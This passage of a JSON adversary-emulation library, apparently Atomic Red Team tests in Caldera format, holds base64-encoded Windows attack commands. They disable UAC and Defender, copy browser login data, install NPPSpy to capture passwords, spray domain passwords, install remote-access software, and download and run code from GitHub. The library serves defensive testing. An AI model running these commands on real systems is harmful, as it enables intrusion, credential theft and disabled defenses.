"cmVnIGFkZCBIS0VZX0NVUlJFTlRfVVNFUlxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxFeHBsb3JlclxBZHZhbmNlZCAvdCBSRUdfRFdPUkQgL3YgSGlkZUZpbGVFeHQgL2QgMSAvZg==", "ability_id": "643c8598821703ea4e29f261d5c6e191", "technique_name": "Modify Registry", "additional_info": {}, "privilege": "", "technique_id": "T1112", "platform": "windows", "name": "Modify Registry of Current User Profile - cmd", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["cmVnIGRlbGV0ZSBIS0VZX0NVUlJFTlRfVVNFUlxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxFeHBsb3JlclxBZHZhbmNlZCAvdiBIaWRlRmlsZUV4dCAvZiA+bnVsIDI+JjE="], "executor": "cmd", "access": {}, "description": "Modify the registry of the currently logged in user using reg.exe via cmd console. Upon execution, the message \"The operation completed successfully.\"\nwill be displayed. Additionally, open Registry Editor to view the new entry in HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced.\n", "variations": []}, {"test": "SW52b2tlLUV4cHJlc3Npb24gODkzNjg3X1QxMDI3LjAwNF9EeW5hbWljQ29tcGlsZS5leGU=", "ability_id": "3022facafc3264afd24940cb51e262f6", "technique_name": "Obfuscated Files or Information: Compile After Delivery", "additional_info": {}, "privilege": "", "technique_id": "T1027.004", "platform": "windows", "name": "Dynamic C# Compile", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["893687_T1027.004_DynamicCompile.exe"], "cleanup": ["UmVtb3ZlLUl0ZW0gLUZvcmNlIC1QYXRoICI4OTM2ODdfVDEwMjcuMDA0X0R5bmFtaWNDb21waWxlLmV4ZSI="], "executor": "psh", "access": {}, "description": "When C# is compiled dynamically, a .cmdline file will be created as a part of the process. \nCertain processes are not typically observed compiling C# code, but can do so without touching disk. This can be used to unpack a payload for execution.\nThe exe file that will be executed is named as T1027.004_DynamicCompile.exe is containted in the 'bin' folder of this atomic, and the source code to the file is in the 'src' folder.\nUpon execution, the exe will print 'T1027.004 Dynamic Compile'.\n", "variations": []}, {"test": "SW52b2tlLUFUSENvbXBpbGVkSGVscCAtSEhGaWxlUGF0aCAkZW52OndpbmRpclxoaC5leGUgLUNITUZpbGVQYXRoIFRlc3QuY2ht", "ability_id": "fffc5cc7a52a08229fb340862c05f1a3", "technique_name": "Signed Binary Proxy Execution: Compiled HTML File", "additional_info": {}, "privilege": "", "technique_id": "T1218.001", "platform": "windows", "name": "Invoke CHM with default Shortcut Command Execution", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Executes a CHM file with the default Shortcut Command method.", "variations": []}, {"test": "bmV0c2ggYWR2ZmlyZXdhbGwgZmlyZXdhbGwgc2hvdyBydWxlIG5hbWU9YWxs", "ability_id": "71b3d2945679566b9d94d8cb11df4b70", "technique_name": "System Network Configuration Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1016", "platform": "windows", "name": "List Windows Firewall Rules", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Enumerates Windows Firewall Rules using netsh.\n\nUpon successful execution, cmd.exe will spawn netsh.exe to list firewall rules. Output will be via stdout.\n", "variations": []}, {"test": "JG1hbGNtZGxldHMgPSAiQWRkLVBlcnNpc3RlbmNlIiwgIkZpbmQtQVZTaWduYXR1cmUiLCAiR2V0LUdQUEF1dG9sb2dvbiIsICJHZXQtR1BQUGFzc3dvcmQiLCAiR2V0LUh0dHBTdGF0dXMiLCAiR2V0LUtleXN0cm9rZXMiLCAiR2V0LVNlY3VyaXR5UGFja2FnZXMiLCAiR2V0LVRpbWVkU2NyZWVuc2hvdCIsICJHZXQtVmF1bHRDcmVkZW50aWFsIiwgIkdldC1Wb2x1bWVTaGFkb3dDb3B5IiwgIkluc3RhbGwtU1NQIiwgIkludm9rZS1DcmVkZW50aWFsSW5qZWN0aW9uIiwgIkludm9rZS1EbGxJbmplY3Rpb24iLCAiSW52b2tlLU1pbWlrYXR6IiwgIkludm9rZS1OaW5qYUNvcHkiLCAiSW52b2tlLVBvcnRzY2FuIiwgIkludm9rZS1SZWZsZWN0aXZlUEVJbmplY3Rpb24iLCAiSW52b2tlLVJldmVyc2VEbnNMb29rdXAiLCAiSW52b2tlLVNoZWxsY29kZSIsICJJbnZva2UtVG9rZW5NYW5pcHVsYXRpb24iLCAiSW52b2tlLVdtaUNvbW1hbmQiLCAiTW91bnQtVm9sdW1lU2hhZG93Q29weSIsICJOZXctRWxldmF0ZWRQZXJzaXN0ZW5jZU9wdGlvbiIsICJOZXctVXNlclBlcnNpc3RlbmNlT3B0aW9uIiwgIk5ldy1Wb2x1bWVTaGFkb3dDb3B5IiwgIk91dC1Db21wcmVzc2VkRGxsIiwgIk91dC1FbmNvZGVkQ29tbWFuZCIsICJPdXQtRW5jcnlwdGVkU2NyaXB0IiwgIk91dC1NaW5pZHVtcCIsICJQb3dlclVwIiwgIlBvd2VyVmlldyIsICJSZW1vdmUtQ29tbWVudHMiLCAiUmVtb3ZlLVZvbHVtZVNoYWRvd0NvcHkiLCAiU2V0LUNyaXRpY2FsUHJvY2VzcyIsICJTZXQtTWFzdGVyQm9vdFJlY29yZCI7IDsgZm9yZWFjaCAoJGNtZGxldHMgaW4gJG1hbGNtZGxldHMpIHs7ICAgICAiZnVuY3Rpb24gJGNtZGxldHMgeyBXcml0ZS1Ib3N0IFByZXRlbmRpbmcgdG8gaW52b2tlICRjbWRsZXRzIH0ifTsgZm9yZWFjaCAoJGNtZGxldHMgaW4gJG1hbGNtZGxldHMpIHs7ICAgICAkY21kbGV0c30=", "ability_id": "b492e690d7d56f96a350a436b08493fb", "technique_name": "Command and Scripting Interpreter: PowerShell", "additional_info": {}, "privilege": "", "technique_id": "T1059.001", "platform": "windows", "name": "PowerShell Invoke Known Malicious Cmdlets", "requirements": [], "tactic": "execution", "buckets": ["execution"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Powershell execution of known Malicious PowerShell Cmdlets", "variations": []}, {"test": "bXNodGEgdmJzY3JpcHQ6RXhlY3V0ZSgiQ3JlYXRlT2JqZWN0KCIiV3NjcmlwdC5TaGVsbCIiKS5SdW4gIiJwb3dlcnNoZWxsIC1ub2V4aXQgLWZpbGUgUGF0aFRvQXRvbWljc0ZvbGRlclxUMTIxOC4wMDVcc3JjXHBvd2Vyc2hlbGwucHMxIiI6Y2xvc2UiKQ==", "ability_id": "e5ca57d20f8608e2acc0808b8dd8726c", "technique_name": "Signed Binary Proxy Execution: Mshta", "additional_info": {}, "privilege": "", "technique_id": "T1218.005", "platform": "windows", "name": "Mshta executes VBScript to execute malicious command", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Run a local VB script to run local user enumeration powershell command.\nThis attempts to emulate what FIN7 does with this technique which is using mshta.exe to execute VBScript to execute malicious code on victim systems.\nUpon execution, a new PowerShell windows will be opened that displays user information.\n", "variations": []}, {"test": "JGltZXdkYmxlZCA9ICRlbnY6U3lzdGVtUm9vdCArICJcU3lzdGVtMzJcSU1FXFNIQVJFRFxJTUVXREJMRC5leGUiOyAmICRpbWV3ZGJsZWQgaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3JlZGNhbmFyeWNvL2F0b21pYy1yZWQtdGVhbS9tYXN0ZXIvYXRvbWljcy9UMTEwNS9UMTEwNS55YW1s", "ability_id": "04d33ddae0126966ae6d841267c17329", "technique_name": "Ingress Tool Transfer", "additional_info": {}, "privilege": "", "technique_id": "T1105", "platform": "windows", "name": "Download a file with IMEWDBLD.exe", "requirements": [], "tactic": "command-and-control", "buckets": ["command-and-control"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["JGluZXRjYWNoZSA9ICRlbnY6TE9DQUxBUFBEQVRBICsgIlxNaWNyb3NvZnRcV2luZG93c1xJTmV0Q2FjaGVcIiA7ICRmaWxlX3RvX2JlX3JlbW92ZWQgPSBbc3RyaW5nW11dIChHZXQtQ2hpbGRJdGVtIC1QYXRoICRpbmV0Y2FjaGUgLUluY2x1ZGUgVDExMDUqIC1SZWN1cnNlIC1Gb3JjZSAtRmlsZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSk7IGlmKCIiIC1uZSAiJGZpbGVfdG9fYmVfcmVtb3ZlZCIpIHsgUmVtb3ZlLUl0ZW0gIiRmaWxlX3RvX2JlX3JlbW92ZWQiIC1FcnJvckFjdGlvbiBJZ25vcmUgfQ=="], "executor": "psh", "access": {}, "description": "Use IMEWDBLD.exe (built-in to windows) to download a file. This will throw an error for an invalid dictionary file.\nDownloaded files can be found in \"%LocalAppData%\\Microsoft\\Windows\\INetCache\\<8_RANDOM_ALNUM_CHARS>/<FILENAME>[1].<EXTENSION>\" or `%LocalAppData%\\Microsoft\\Windows\\INetCache\\IE\\<8_RANDOM_ALNUM_CHARS>/<FILENAME>[1].<EXTENSION>.\nRun \"Get-ChildItem -Path C:\\Users\\<USERNAME>\\AppData\\Local\\Microsoft\\Windows\\INetCache\\ -Include <FILENAME>* -Recurse -Force -File -ErrorAction SilentlyContinue\" without quotes and adding the correct username and file name to locate the file.\n", "variations": []}, {"test": "cmVnLmV4ZSBBREQgSEtMTVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxQb2xpY2llc1xTeXN0ZW0gL3YgRW5hYmxlTFVBIC90IFJFR19EV09SRCAvZCAwIC9m", "ability_id": "3a67bc42e7f567d9faffab9af37afa72", "technique_name": "Abuse Elevation Control Mechanism: Bypass User Access Control", "additional_info": {}, "privilege": "", "technique_id": "T1548.002", "platform": "windows", "name": "Disable UAC using reg.exe", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["cmVnLmV4ZSBBREQgSEtMTVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxQb2xpY2llc1xTeXN0ZW0gL3YgRW5hYmxlTFVBIC90IFJFR19EV09SRCAvZCAxIC9m"], "executor": "cmd", "access": {}, "description": "Disable User Account Conrol (UAC) using the builtin tool reg.exe by changing its registry key\nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\EnableLUA from 1 to 0\n", "variations": []}, {"test": "d21pYyBwcm9jZXNzIGxpc3QgL0ZPUk1BVDoiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3JlZGNhbmFyeWNvL2F0b21pYy1yZWQtdGVhbS9tYXN0ZXIvYXRvbWljcy9UMTIyMC9zcmMvd21pY3NjcmlwdC54c2wi", "ability_id": "f904f827be1d5ae9766c370947778ced", "technique_name": "XSL Script Processing", "additional_info": {}, "privilege": "", "technique_id": "T1220", "platform": "windows", "name": "WMIC bypass using remote XSL file", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Executes the code specified within a XSL script using a remote payload. Open Calculator.exe when test successfully executed, while AV turned off.\n", "variations": []}, {"test": "R2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCBIS0xNOlxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvbg==", "ability_id": "2488245e-bcbd-405d-920e-2de27db882b3", "technique_name": "Query Registry", "additional_info": {}, "privilege": "", "technique_id": "T1012", "platform": "windows", "name": "Query Registry", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Query Registry using PowerShell Get-ItemProperty", "variations": []}, {"test": "Q29weS1JdGVtICIkZW52OkxPQ0FMQVBQREFUQVxNaWNyb3NvZnRcRWRnZVxVc2VyIERhdGFcRGVmYXVsdCIgLURlc3RpbmF0aW9uICRlbnY6dGVtcFxFZGdlIC1Gb3JjZSAtUmVjdXJzZQ==", "ability_id": "8e51d03e79c614586cbd5efecf7b85e3", "technique_name": "Credentials from Password Stores: Credentials from Web Browsers", "additional_info": {}, "privilege": "", "technique_id": "T1555.003", "platform": "windows", "name": "Simulating access to Windows Edge Login Data", "requirements": [], "tactic": "credential-access", "buckets": ["credential-access"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["UmVtb3ZlLUl0ZW0gLVBhdGggIiRlbnY6dGVtcFxFZGdlIiAtRm9yY2UgLUVycm9yQWN0aW9uIElnbm9yZSAtUmVjdXJzZQ=="], "executor": "psh", "access": {}, "description": "Simulates an adversary accessing encrypted credentials from Edge web browser's login database.\nmore info in https://www.forensicfocus.com/articles/chromium-based-microsoft-edge-from-a-forensic-point-of-view/\n", "variations": []}, {"test": "SW1wb3J0LU1vZHVsZSAuL2Jhc2ljX3NjYW5uZXIucHMxOyRwb3J0cyA9IEAoMjIsIDUzLCA4MCwgNDQ1KTtHZXQtTmV0SVBDb25maWd1cmF0aW9uIHwgP3skXy5OZXRBZGFwdGVyLlN0YXR1cyAtbmUgIkRpc2Nvbm5lY3RlZCJ9IHwgR2V0LU5ldElQYWRkcmVzcyAtQWRkcmVzc0ZhbWlseSBJUHY0IHwgJXsgICAgJGlwdjQgPSAkXy5JUEFkZHJlc3M7ICAgICRwcmVmaXhMZW5ndGggPSAkXy5QcmVmaXhMZW5ndGg7ICAgIFNjYW4tTmV0cmFuZ2UgLWlwdjQgJGlwdjQgLXByZWZpeExlbmd0aCAkcHJlZml4TGVuZ3RoIC1wb3J0cyAkcG9ydHM7fTs=", "ability_id": "5a4cb2be-2684-4801-9355-3a90c91e0004", "technique_name": "Network Service Scanning", "additional_info": {}, "privilege": "", "technique_id": "T1046", "platform": "windows", "name": "Network Service Scanning", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 180, "uploads": [], "parsers": [], "payloads": ["basic_scanner.ps1"], "cleanup": ["UmVtb3ZlLUl0ZW0gLUZvcmNlIC1QYXRoICJiYXNpY19zY2FubmVyLnBzMSI="], "executor": "psh", "access": {}, "description": "Scans the local network for common open ports", "variations": []}, {"test": "RGlzbSAvb25saW5lIC9EaXNhYmxlLUZlYXR1cmUgL0ZlYXR1cmVOYW1lOldpbmRvd3MtRGVmZW5kZXIgL1JlbW92ZSAvTm9SZXN0YXJ0IC9xdWlldA==", "ability_id": "93b4f004682dfb6d1af15e01c2859f93", "technique_name": "Impair Defenses: Disable or Modify Tools", "additional_info": {}, "privilege": "", "technique_id": "T1562.001", "platform": "windows", "name": "Disable Windows Defender with DISM", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "The following Atomic will attempt to disable Windows-Defender using the built in DISM.exe, Deployment Image Servicing and Management tool. \nDISM is used to enumerate, install, uninstall, configure, and update features and packages in Windows images.\nA successful execution will not standard-out any details. Remove the quiet switch if verbosity is needed.\nThis method will remove Defender and it's package.\n", "variations": []}, {"test": "SW1wb3J0LU1vZHVsZSAuXFBvd2VyVmlldy5wczEgLUZvcmNlO0dldC1OZXRDb21wdXRlcg==", "ability_id": "0360ede1-3c28-48d3-a6ef-6e98f562c5af", "technique_name": "Remote System Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1018", "platform": "windows", "name": "GetComputers (Alice)", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["powerview.ps1"], "cleanup": ["UmVtb3ZlLUl0ZW0gLUZvcmNlIC1QYXRoICJwb3dlcnZpZXcucHMxIg=="], "executor": "psh", "access": {}, "description": "Get a list of all computers in a domain", "variations": []}, {"test": "W05ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VjdXJpdHlQcm90b2NvbCA9IFtOZXQuU2VjdXJpdHlQcm90b2NvbFR5cGVdOjpUbHMxMjsgSUVYIChpd3IgImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9yZWRjYW5hcnljby9hdG9taWMtcmVkLXRlYW0vbWFzdGVyL2F0b21pY3MvVDEyMDQuMDAyL3NyYy9JbnZva2UtTWFsRG9jLnBzMSIgLVVzZUJhc2ljUGFyc2luZyk7ICRtYWNyb2NvZGUgPSAiICAgT3BlbiBgIkM6XFVzZXJzXFB1YmxpY1xhcnQuanNlYCIgRm9yIE91dHB1dCBBcyAjMWBuICAgV3JpdGUgIzEsIGAiV1NjcmlwdC5RdWl0YCJgbiAgIENsb3NlICMxYG4gICBhID0gU2hlbGwoYCJjbWQuZXhlIC9jIHdzY3JpcHQuZXhlIC8vRTpqc2NyaXB0IEM6XFVzZXJzXFB1YmxpY1xhcnQuanNlYCIsIHZiTm9ybWFsRm9jdXMpYG4iOyBJbnZva2UtTWFsRG9jIC1tYWNyb0NvZGUgJG1hY3JvY29kZSAtb2ZmaWNlUHJvZHVjdCAiV29yZCI=", "ability_id": "591f5d57f5d87e3e0202fc46375c780d", "technique_name": "User Execution: Malicious File", "additional_info": {}, "privilege": "", "technique_id": "T1204.002", "platform": "windows", "name": "OSTAP JS version", "requirements": [], "tactic": "execution", "buckets": ["execution"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Malicious JavaScript executing CMD which spawns wscript.exe //e:jscript\nExecution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.\n", "variations": []}, {"test": "cGNhbHVhLmV4ZSAtYSAje3Byb2Nlc3N9ICYmIHBjYWx1YS5leGUgLWEgI3twYXlsb2FkX3BhdGh9", "ability_id": "0cde0bf95358898eb590ec0c1812cbdd", "technique_name": "Indirect Command Execution", "additional_info": {}, "privilege": "", "technique_id": "T1202", "platform": "windows", "name": "Indirect Command Execution - pcalua.exe", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "The Program Compatibility Assistant (pcalua.exe) may invoke the execution of programs and commands from a Command-Line Interface.\n[Reference](https://twitter.com/KyleHanslovan/status/912659279806640128)\nUpon execution, calc.exe should open\n", "variations": []}, {"test": "d21pYyBwcm9jZXNzIGdldCBjYXB0aW9uLGV4ZWN1dGFibGVwYXRoLGNvbW1hbmRsaW5lIC9mb3JtYXQ6Y3N2", "ability_id": "ac2764f7a67a9ce92b54e8e59b361838", "technique_name": "Windows Management Instrumentation", "additional_info": {}, "privilege": "", "technique_id": "T1047", "platform": "windows", "name": "WMI Reconnaissance Processes", "requirements": [], "tactic": "execution", "buckets": ["execution"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "An adversary might use WMI to list Processes running on the compromised host.\nWhen the test completes , there should be running processes listed on the command line.\n", "variations": []}, {"test": "JGluc3RhbGxlciA9ICJDOlxVc2Vyc1wkZW52OnVzZXJuYW1lXERvd25sb2Fkc1xTY3JlZW5Db25uZWN0Lm1zaSI7IEludm9rZS1XZWJSZXF1ZXN0IC1PdXRGaWxlICRpbnN0YWxsZXIgImh0dHBzOi8vZDFrdXl1cW93dmU1aWQuY2xvdWRmcm9udC5uZXQvU2NyZWVuQ29ubmVjdF8yMS4xMS40MjM3Ljc4ODVfUmVsZWFzZS5tc2kiOyBtc2lleGVjIC9pICRpbnN0YWxsZXIgL3Fu", "ability_id": "9332aff267b00ede37b09606340ee1dc", "technique_name": "Remote Access Software", "additional_info": {}, "privilege": "", "technique_id": "T1219", "platform": "windows", "name": "ScreenConnect Application Download and Install on Windows", "requirements": [], "tactic": "command-and-control", "buckets": ["command-and-control"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["JGluc3RhbGxlciA9ICJDOlxVc2Vyc1wkZW52OnVzZXJuYW1lXERvd25sb2Fkc1xTY3JlZW5Db25uZWN0Lm1zaSI7IG1zaWV4ZWMgL3ggJGluc3RhbGxlciAvcW4="], "executor": "psh", "access": {}, "description": "An adversary may attempt to trick the user into downloading ScreenConnect for use as a C2 channel. Download of ScreenConnect installer will be in the Downloads directory.\nMsiexec will be used to quietly insall ScreenConnect.\n", "variations": []}, {"test": "W05ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VjdXJpdHlQcm90b2NvbCA9IFtOZXQuU2VjdXJpdHlQcm90b2NvbFR5cGVdOjpUbHMxMjsgSUVYIChJV1IgJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9kYWZ0aGFjay9Eb21haW5QYXNzd29yZFNwcmF5Lzk0Y2I3MjUwNmI5ZTI3NjgxOTZjOGI2YTRiN2FmNjNjZWJjNDdkODgvRG9tYWluUGFzc3dvcmRTcHJheS5wczEnIC1Vc2VCYXNpY1BhcnNpbmcpOyBJbnZva2UtRG9tYWluUGFzc3dvcmRTcHJheSAtUGFzc3dvcmQgU3ByaW5nMjAxNyAtRG9tYWluICRFbnY6VVNFUkRPTUFJTiAtRm9yY2U=", "ability_id": "da877dda7da63e639ddb0b6a770ebb5c", "technique_name": "Brute Force: Password Spraying", "additional_info": {}, "privilege": "", "technique_id": "T1110.003", "platform": "windows", "name": "Password Spray (DomainPasswordSpray)", "requirements": [], "tactic": "credential-access", "buckets": ["credential-access"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Perform a domain password spray using the DomainPasswordSpray tool. It will try a single password against all users in the domain\n\nhttps://github.com/dafthack/DomainPasswordSpray\n", "variations": []}, {"test": "Q29weS1JdGVtICIkZW52OlRlbXBcTlBQU1BZLmRsbCIgLURlc3RpbmF0aW9uICJDOlxXaW5kb3dzXFN5c3RlbTMyIjsgJHBhdGggPSBHZXQtSXRlbVByb3BlcnR5IC1QYXRoICJIS0xNOlxTWVNURU1cQ3VycmVudENvbnRyb2xTZXRcQ29udHJvbFxOZXR3b3JrUHJvdmlkZXJcT3JkZXIiIC1OYW1lIFBST1ZJREVST1JERVI7ICRVcGRhdGVkVmFsdWUgPSAkUGF0aC5QUk9WSURFUk9SREVSICsgIixOUFBTcHkiOyBTZXQtSXRlbVByb3BlcnR5IC1QYXRoICRQYXRoLlBTUGF0aCAtTmFtZSAiUFJPVklERVJPUkRFUiIgLVZhbHVlICRVcGRhdGVkVmFsdWU7ICRydiA9IE5ldy1JdGVtIC1QYXRoIEhLTE06XFNZU1RFTVxDdXJyZW50Q29udHJvbFNldFxTZXJ2aWNlc1xOUFBTcHkgLUVycm9yQWN0aW9uIElnbm9yZTsgJHJ2ID0gTmV3LUl0ZW0gLVBhdGggSEtMTTpcU1lTVEVNXEN1cnJlbnRDb250cm9sU2V0XFNlcnZpY2VzXE5QUFNweVxOZXR3b3JrUHJvdmlkZXIgLUVycm9yQWN0aW9uIElnbm9yZTsgJHJ2ID0gTmV3LUl0ZW1Qcm9wZXJ0eSAtUGF0aCBIS0xNOlxTWVNURU1cQ3VycmVudENvbnRyb2xTZXRcU2VydmljZXNcTlBQU3B5XE5ldHdvcmtQcm92aWRlciAtTmFtZSAiQ2xhc3MiIC1WYWx1ZSAyIC1FcnJvckFjdGlvbiBJZ25vcmU7ICRydiA9IE5ldy1JdGVtUHJvcGVydHkgLVBhdGggSEtMTTpcU1lTVEVNXEN1cnJlbnRDb250cm9sU2V0XFNlcnZpY2VzXE5QUFNweVxOZXR3b3JrUHJvdmlkZXIgLU5hbWUgIk5hbWUiIC1WYWx1ZSBOUFBTcHkgLUVycm9yQWN0aW9uIElnbm9yZTsgJHJ2ID0gTmV3LUl0ZW1Qcm9wZXJ0eSAtUGF0aCBIS0xNOlxTWVNURU1cQ3VycmVudENvbnRyb2xTZXRcU2VydmljZXNcTlBQU3B5XE5ldHdvcmtQcm92aWRlciAtTmFtZSAiUHJvdmlkZXJQYXRoIiAtUHJvcGVydHlUeXBlIEV4cGFuZFN0cmluZyAtVmFsdWUgIiVTeXN0ZW1Sb290JVxTeXN0ZW0zMlxOUFBTUFkuZGxsIiAtRXJyb3JBY3Rpb24gSWdub3JlOyBlY2hvICJbIV0gUGxlYXNlLCBsb2dvdXQgYW5kIGxvZyBiYWNrIGluLiBDbGVhcnRleHQgcGFzc3dvcmQgZm9yIHRoaXMgYWNjb3VudCBpcyBnb2luZyB0byBiZSBsb2NhdGVkIGluIEM6XE5QUFNweS50eHQi", "ability_id": "44df0e5fd9ba43087400e0348aa5ac1c", "technique_name": "OS Credential Dumping", "additional_info": {}, "privilege": "", "technique_id": "T1003", "platform": "windows", "name": "Credential Dumping with NPPSpy", "requirements": [], "tactic": "credential-access", "buckets": ["credential-access"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["JGNsZWFudXBQYXRoID0gR2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAiSEtMTTpcU1lTVEVNXEN1cnJlbnRDb250cm9sU2V0XENvbnRyb2xcTmV0d29ya1Byb3ZpZGVyXE9yZGVyIiAtTmFtZSBQUk9WSURFUk9SREVSOyAkY2xlYW51cFVwZGF0ZWRWYWx1ZSA9ICRjbGVhbnVwUGF0aC5QUk9WSURFUk9SREVSIDsgJGNsZWFudXBVcGRhdGVkVmFsdWUgPSAkY2xlYW51cFVwZGF0ZWRWYWx1ZSAtcmVwbGFjZSAnLE5QUFNweScsJyc7IFNldC1JdGVtUHJvcGVydHkgLVBhdGggJGNsZWFudXBQYXRoLlBTUGF0aCAtTmFtZSAiUFJPVklERVJPUkRFUiIgLVZhbHVlICRjbGVhbnVwVXBkYXRlZFZhbHVlOyBSZW1vdmUtSXRlbSAtUGF0aCAiSEtMTTpcU1lTVEVNXEN1cnJlbnRDb250cm9sU2V0XFNlcnZpY2VzXE5QUFNweSIgLVJlY3Vyc2UgLUVycm9yQWN0aW9uIElnbm9yZTsgUmVtb3ZlLUl0ZW0gQzpcTlBQU3B5LnR4dCAtRXJyb3JBY3Rpb24gSWdub3JlOyBSZW1vdmUtSXRlbSBDOlxXaW5kb3dzXFN5c3RlbTMyXE5QUFNweS5kbGwgLUVycm9yQWN0aW9uIElnbm9yZQ=="], "executor": "psh", "access": {}, "description": "Changes ProviderOrder Registry Key Parameter and creates Key for NPPSpy.\nAfter user's logging in cleartext password is saved in C:\\NPPSpy.txt.\nClean up deletes the files and reverses Registry changes.\nNPPSpy Source: https://github.com/gtworek/PSBits/tree/master/PasswordStealing/NPPSpy", "variations": []}, {"test": "bmV0IHVzZXI7IGdldC1sb2NhbHVzZXI7IGdldC1sb2NhbGdyb3VwbWVtYmVyIC1ncm91cCBVc2VyczsgY21ka2V5LmV4ZSAvbGlzdDsgbHMgQzovVXNlcnM7IGdldC1jaGlsZGl0ZW0gQzpcVXNlcnNcOyBkaXIgQzpcVXNlcnNcOyBnZXQtbG9jYWxncm91cDsgbmV0IGxvY2FsZ3JvdXA=", "ability_id": "e528524d6a3cddaaddc89fcc719e2a3f", "technique_name": "Account Discovery: Local Account", "additional_info": {}, "privilege": "", "technique_id": "T1087.001", "platform": "windows", "name": "Enumerate all accounts via PowerShell (Local)", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Enumerate all accounts via PowerShell. Upon execution, lots of user account and group information will be displayed.\n", "variations": []}, {"test": "Yml0c2FkbWluLmV4ZSAvY3JlYXRlIEF0b21pY0JJVFMgJiYgYml0c2FkbWluLmV4ZSAvYWRkZmlsZSBBdG9taWNCSVRTIGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9yZWRjYW5hcnljby9hdG9taWMtcmVkLXRlYW0vbWFzdGVyL2F0b21pY3MvVDExOTcvVDExOTcubWQgJXRlbXAlXGJpdHNhZG1pbjNfZmxhZy5wczEgJiYgYml0c2FkbWluLmV4ZSAvc2V0bm90aWZ5Y21kbGluZSBBdG9taWNCSVRTIEM6XFdpbmRvd3Ncc3lzdGVtMzJcbm90ZXBhZC5leGUgTlVMTCAmJiBiaXRzYWRtaW4uZXhlIC9yZXN1bWUgQXRvbWljQklUUyAmJiB0aW1lb3V0IDUgJiYgYml0c2FkbWluLmV4ZSAvY29tcGxldGUgQXRvbWljQklUUw==", "ability_id": "1ab8c89fddc1a5a88790b82dcbb43708", "technique_name": "BITS Jobs", "additional_info": {}, "privilege": "", "technique_id": "T1197", "platform": "windows", "name": "Persist, Download, & Execute", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["ZGVsICV0ZW1wJVxiaXRzYWRtaW4zX2ZsYWcucHMxID5udWwgMj4mMQ=="], "executor": "cmd", "access": {}, "description": "This test simulates an adversary leveraging bitsadmin.exe to schedule a BITS transferand execute a payload in multiple steps.\nNote that in this test, the file executed is not the one downloaded. The downloading of a random file is simply the trigger for getting 